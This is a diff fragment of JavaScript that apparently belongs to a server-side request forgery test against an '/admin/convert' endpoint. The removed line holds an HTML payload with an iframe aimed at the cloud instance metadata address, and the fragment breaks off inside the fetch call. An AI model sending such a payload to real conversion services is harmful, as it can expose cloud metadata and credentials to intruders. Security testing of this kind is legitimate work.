@@ -1,4 +1,4 @@
-const htmlCode = "<body><iframe src='http://169.254.169.254/latest/meta-data/'></iframe></body>";
+const htmlCode = "ccc";
 
 fetch('/admin/convert', {
   method: 'POST',
